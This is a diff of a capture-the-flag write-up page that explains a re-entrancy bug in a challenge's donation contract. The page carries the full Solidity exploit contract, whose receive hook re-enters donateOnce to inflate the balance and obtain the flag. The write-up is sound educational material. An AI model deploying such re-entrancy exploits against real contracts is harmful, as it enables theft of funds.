@@ -5,6 +5,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
 	<title>RiceSec</title>
 
+	<link href="/writeups/css/prism-one-light.css" rel="stylesheet" />
 	<link rel="stylesheet" href="/writeups/css/style.css" />
 </head>
 
@@ -20,44 +21,7 @@
 <h1>donate-more</h1>
 
 <p>This challenge was about <a href="https://solidity-by-example.org/hacks/re-entrancy/">re-entrancy</a>. In <code>donateOnce</code>, the call to <code>msg.sender.call</code> is made before <code>doneDonating[msg.sender]</code> is set to <code>true</code>. If we call <code>donation.donateOnce()</code> in our <code>receive</code> hook, we can &quot;enter&quot; the <code>donateOnce</code> body multiple times without being blocked by the if-statement. The later calls execute before the first one has a chance to complete.</p>
-<pre><code class="language-js">// SPDX-License-Identifier: MIT
-
-pragma solidity &gt;=0.8.7;
-
-abstract contract CSAWDonation {
-    mapping(address =&gt; uint256) public balances;
-    mapping(address =&gt; bool) public doneDonating;
-
-    function newAccount() virtual public payable;
-    function donateOnce() virtual public;
-    function getBalance() virtual public view returns (uint256 donatorBalance);
-    function getFlag(bytes32 _token) virtual public;
-}
-
-contract CSAWDonate {
-    CSAWDonation public donation;
-
-    constructor(address donationAddress) payable {
-        require(msg.value &gt;= 0.0005 ether);
-        donation = CSAWDonation(donationAddress);
-    }
-
-    receive() external payable {
-        if (donation.getBalance() &lt; 30) {
-            donation.donateOnce();
-        }
-    }
-
-    function main() external {
-        donation.newAccount{value: 0.0001 ether}();
-        donation.donateOnce();
-    }
-
-    function getFlag(bytes32 _token) external {
-        donation.getFlag(_token);
-    }
-}
-</code></pre>
+<pre class="language-js"><code class="language-js"><span class="token comment">// SPDX-License-Identifier: MIT</span><br><br>pragma solidity <span class="token operator">>=</span><span class="token number">0.8</span><span class="token number">.7</span><span class="token punctuation">;</span><br><br>abstract contract CSAWDonation <span class="token punctuation">{</span><br>    <span class="token function">mapping</span><span class="token punctuation">(</span><span class="token parameter">address</span> <span class="token operator">=></span> uint256<span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span><br>    <span class="token function">mapping</span><span class="token punctuation">(</span><span class="token parameter">address</span> <span class="token operator">=></span> bool<span class="token punctuation">)</span> <span class="token keyword">public</span> doneDonating<span class="token punctuation">;</span><br><br>    <span class="token keyword">function</span> <span class="token function">newAccount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> virtual <span class="token keyword">public</span> payable<span class="token punctuation">;</span><br>    <span class="token keyword">function</span> <span class="token function">donateOnce</span><span class="token punctuation">(</span><span class="token punctuation">)</span> virtual <span class="token keyword">public</span><span class="token punctuation">;</span><br>    <span class="token keyword">function</span> <span class="token function">getBalance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> virtual <span class="token keyword">public</span> view <span class="token function">returns</span> <span class="token punctuation">(</span>uint256 donatorBalance<span class="token punctuation">)</span><span class="token punctuation">;</span><br>    <span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token parameter">bytes32 _token</span><span class="token punctuation">)</span> virtual <span class="token keyword">public</span><span class="token punctuation">;</span><br><span class="token punctuation">}</span><br><br>contract CSAWDonate <span class="token punctuation">{</span><br>    CSAWDonation <span class="token keyword">public</span> donation<span class="token punctuation">;</span><br><br>    <span class="token function">constructor</span><span class="token punctuation">(</span>address donationAddress<span class="token punctuation">)</span> payable <span class="token punctuation">{</span><br>        <span class="token function">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">>=</span> <span class="token number">0.0005</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span><br>        donation <span class="token operator">=</span> <span class="token function">CSAWDonation</span><span class="token punctuation">(</span>donationAddress<span class="token punctuation">)</span><span class="token punctuation">;</span><br>    <span class="token punctuation">}</span><br><br>    <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> external payable <span class="token punctuation">{</span><br>        <span class="token keyword">if</span> <span class="token punctuation">(</span>donation<span class="token punctuation">.</span><span class="token function">getBalance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">30</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><br>            donation<span class="token punctuation">.</span><span class="token function">donateOnce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>        <span class="token punctuation">}</span><br>    <span class="token punctuation">}</span><br><br>    <span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> external <span class="token punctuation">{</span><br>        donation<span class="token punctuation">.</span>newAccount<span class="token punctuation">{</span><span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token number">0.0001</span> ether<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>        donation<span class="token punctuation">.</span><span class="token function">donateOnce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>    <span class="token punctuation">}</span><br><br>    <span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token parameter">bytes32 _token</span><span class="token punctuation">)</span> external <span class="token punctuation">{</span><br>        donation<span class="token punctuation">.</span><span class="token function">getFlag</span><span class="token punctuation">(</span>_token<span class="token punctuation">)</span><span class="token punctuation">;</span><br>    <span class="token punctuation">}</span><br><span class="token punctuation">}</span></code></pre>
 <p>After constructing <a href="https://ropsten.etherscan.io/address/0xC00d696718ae9dF26F61385570ACcd2737A8a57a">our contract</a> with the address of their <code>CSAWDonation</code> contract, we call <code>main</code>. This brings our balance to 30, preparing us to call <code>getFlag</code>. <a href="https://ropsten.etherscan.io/tx/0x85d0e11f8ac9784712f95f16023c72c69be9aa8c2f50e24a24c2d7bd91b1b342">Calling</a> our pass-through <code>getFlag</code> with the token number from the challenge server gets us the flag.</p>
 
 
